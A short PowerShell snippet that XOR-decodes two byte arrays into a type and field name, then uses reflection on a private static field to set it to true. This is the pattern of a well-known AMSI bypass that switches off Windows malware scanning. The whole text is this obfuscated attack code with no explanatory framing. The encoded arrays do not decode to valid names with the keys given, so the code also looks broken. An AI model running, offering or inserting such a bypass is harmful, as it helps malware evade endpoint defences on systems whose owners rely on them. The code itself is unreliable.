$enc = @(124,125,124,121,110,124,113,126,127,125,120,119,110,124,113,
         126,127,125,120,119,110,120,113,110,114,127,125,124,119,126,
         111,124,126,127,119,124)
$enc2 = @(24,10,3,9,62,14,9,20,69,8,9,13,69,9,8,4,7)

$typeName = -join ($enc | % { [char]($_ -bxor 0x42) })
$fieldName = -join ($enc2 | % { [char]($_ -bxor 0x45) })

$type = [Ref].Assembly.GetType($typeName)
$field = $type.GetField($fieldName,'NonPublic,Static')
$field.SetValue($null,$true)
